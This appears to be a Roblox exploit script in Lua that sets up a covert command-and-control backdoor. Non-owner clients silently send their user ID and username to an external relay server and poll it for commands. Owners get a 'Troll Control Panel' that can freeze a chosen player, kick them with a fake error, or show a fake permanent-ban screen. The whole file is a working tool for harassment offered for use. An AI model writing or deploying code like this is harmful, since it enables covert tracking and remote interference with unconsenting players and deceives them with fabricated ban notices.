-- CONFIGURATION
local RELAY_URL = "https://roblox-troll-relay.onrender.com" -- Your Render URL
local AUTHORIZED_IDS = {
    3100850095,
    10282453521,
    11769862078
}

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

local isOwner = table.find(AUTHORIZED_IDS, LocalPlayer.UserId) ~= nil

-- Safe HTTP Request Wrapper
local function sendHttpRequest(method, endpoint, data)
    local url = RELAY_URL .. endpoint
    local body = data and HttpService:JSONEncode(data) or nil
    local requestMethod = (syn and syn.request) or (fluxus and fluxus.request) or request or HttpService.RequestAsync
    local headers = { ["Content-Type"] = "application/json" }
    
    local success, response
    if requestMethod == HttpService.RequestAsync then
        success, response = pcall(function()
            return HttpService:RequestAsync({ Url = url, Method = method, Headers = headers, Body = body })
        end)
        if success then return response.Body end
    else
        success, response = pcall(function()
            return requestMethod({ Url = url, Method = method, Headers = headers, Body = body })
        end)
        if success then return response.Body end
    end
    return nil
end

-- ACTION HANDLERS (Troll Logic)
local Actions = {
    ["Freeze"] = function()
        local char = LocalPlayer.Character
        if char and char:FindFirstChild("Humanoid") then
            char.Humanoid.WalkSpeed = 0
            char.Humanoid.JumpPower = 0
            for _, part in ipairs(char:GetDescendants()) do
                if part:IsA("BasePart") then part.Anchored = true end
            end
        end
    end,
    ["Unfreeze"] = function()
        local char = LocalPlayer.Character
        if char and char:FindFirstChild("Humanoid") then
            char.Humanoid.WalkSpeed = 16
            char.Humanoid.JumpPower = 50
            for _, part in ipairs(char:GetDescendants()) do
                if part:IsA("BasePart") then part.Anchored = false end
            end
        end
    end,
    ["FakeBan"] = function()
        local coreGui = game:GetService("CoreGui")
        if coreGui:FindFirstChild("FakeBanGui") then return end
        local screen = Instance.new("ScreenGui")
        screen.Name = "FakeBanGui"
        screen.IgnoreGuiInset = true
        screen.ZIndexBehavior = Enum.ZIndexBehavior.Global
        screen.Parent = coreGui
        
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(1, 0, 1, 0)
        frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        frame.Parent = screen
        
        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1, 0, 1, 0)
        label.BackgroundTransparency = 1
        label.TextColor3 = Color3.fromRGB(255, 30, 30)
        label.TextSize = 28
        label.Font = Enum.Font.SourceSansBold
        label.Text = "You have been permanently banned from this experience.\n\nReason: Exploitative Activity / Unexpected Client Behavior\nIncident ID: #" .. math.random(100000, 999999)
        label.Parent = frame
    end,
    ["Kick"] = function()
        LocalPlayer:Kick("An unexpected client error occurred. (Error Code: 273)")
    end
}

-- MAIN EXECUTION
if isOwner then
    -- OWNER GUI CONSTRUCTION
    local CoreGui = game:GetService("CoreGui")
    if CoreGui:FindFirstChild("TrollAdminPanel") then
        CoreGui.TrollAdminPanel:Destroy()
    end
    
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "TrollAdminPanel"
    ScreenGui.Parent = CoreGui
    
    local MainFrame = Instance.new("Frame")
    MainFrame.Size = UDim2.new(0, 280, 0, 380)
    MainFrame.Position = UDim2.new(0.05, 0, 0.2, 0)
    MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    MainFrame.BorderSizePixel = 0
    MainFrame.Active = true
    MainFrame.Draggable = true
    MainFrame.Parent = ScreenGui
    
    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(1, 0, 0, 40)
    Title.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    Title.Text = "Troll Control Panel"
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextSize = 16
    Title.Font = Enum.Font.GothamBold
    Title.Parent = MainFrame
    
    -- Selected Target Tracker
    local selectedTargetId = nil
    
    -- Dropdown Toggle Button
    local DropdownBtn = Instance.new("TextButton")
    DropdownBtn.Size = UDim2.new(0.85, 0, 0, 35)
    DropdownBtn.Position = UDim2.new(0.075, 0, 0.15, 0)
    DropdownBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    DropdownBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    DropdownBtn.Text = "Select Target (Click to Refresh)"
    DropdownBtn.Font = Enum.Font.GothamMedium
    DropdownBtn.TextSize = 13
    DropdownBtn.Parent = MainFrame
    
    -- Dropdown List Container
    local DropdownList = Instance.new("ScrollingFrame")
    DropdownList.Size = UDim2.new(0.85, 0, 0, 120)
    DropdownList.Position = UDim2.new(0.075, 0, 0.26, 0)
    DropdownList.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    DropdownList.BorderSizePixel = 0
    DropdownList.Visible = false
    DropdownList.CanvasSize = UDim2.new(0, 0, 0, 0)
    DropdownList.AutomaticCanvasSize = Enum.AutomaticSize.Y
    DropdownList.Parent = MainFrame
    
    local UIListLayout = Instance.new("UIListLayout")
    UIListLayout.Parent = DropdownList
    UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
    
    -- Function to fetch and display active targets
    local function refreshTargetList()
        for _, child in ipairs(DropdownList:GetChildren()) do
            if child:IsA("TextButton") then child:Destroy() end
        end
        
        task.spawn(function()
            local response = sendHttpRequest("GET", "/players", nil)
            if response then
                local success, data = pcall(function() return HttpService:JSONDecode(response) end)
                if success and data then
                    for userId, info in pairs(data) do
                        if tonumber(userId) ~= LocalPlayer.UserId then
                            local item = Instance.new("TextButton")
                            item.Size = UDim2.new(1, 0, 0, 30)
                            item.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
                            item.TextColor3 = Color3.fromRGB(255, 255, 255)
                            item.Text = info.username .. " (" .. userId .. ")"
                            item.Font = Enum.Font.Gotham
                            item.TextSize = 12
                            item.Parent = DropdownList
                            
                            item.MouseButton1Click:Connect(function()
                                selectedTargetId = userId
                                DropdownBtn.Text = "Target: " .. info.username
                                DropdownList.Visible = false
                            end)
                        end
                    end
                end
            end
        end)
    end
    
    DropdownBtn.MouseButton1Click:Connect(function()
        DropdownList.Visible = not DropdownList.Visible
        if DropdownList.Visible then
            refreshTargetList()
        end
    end)
    
    local function createActionButton(name, yPos, actionName)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0.85, 0, 0, 35)
        btn.Position = UDim2.new(0.075, 0, yPos, 0)
        btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.Text = name
        btn.Font = Enum.Font.GothamMedium
        btn.TextSize = 14
        btn.Parent = MainFrame
        
        btn.MouseButton1Click:Connect(function()
            if selectedTargetId then
                task.spawn(function()
                    sendHttpRequest("POST", "/send", {
                        targetId = selectedTargetId,
                        action = actionName
                    })
                end)
            else
                DropdownBtn.Text = "⚠️ Please select a target first!"
                task.wait(1.5)
                DropdownBtn.Text = "Select Target (Click to Refresh)"
            end
        end)
    end
    
    createActionButton("Freeze Target", 0.62, "Freeze")
    createActionButton("Unfreeze Target", 0.73, "Unfreeze")
    createActionButton("Trigger Fake Ban", 0.84, "FakeBan")
    createActionButton("Force Kick", 0.95, "Kick")
    -- Adjust MainFrame height to fit elements comfortably
    MainFrame.Size = UDim2.new(0, 280, 0, 420)

else
    -- NON-OWNER BACKGROUND STEALTH: Heartbeat & Command Polling
    task.spawn(function()
        while true do
            -- Send presence heartbeat so the owner can see this client is active
            pcall(function()
                sendHttpRequest("POST", "/ping", {
                    userId = tostring(LocalPlayer.UserId),
                    username = LocalPlayer.Name
                })
            end)
            
            -- Poll for commands
            local responseBody = sendHttpRequest("GET", "/poll/" .. LocalPlayer.UserId, nil)
            if responseBody then
                local success, data = pcall(function()
                    return HttpService:JSONDecode(responseBody)
                end)
                if success and data and data.commands then
                    for _, cmd in ipairs(data.commands) do
                        if Actions[cmd] then
                            task.spawn(Actions[cmd])
                        end
                    end
                end
            end
            task.wait(3)
        end
    end)
end
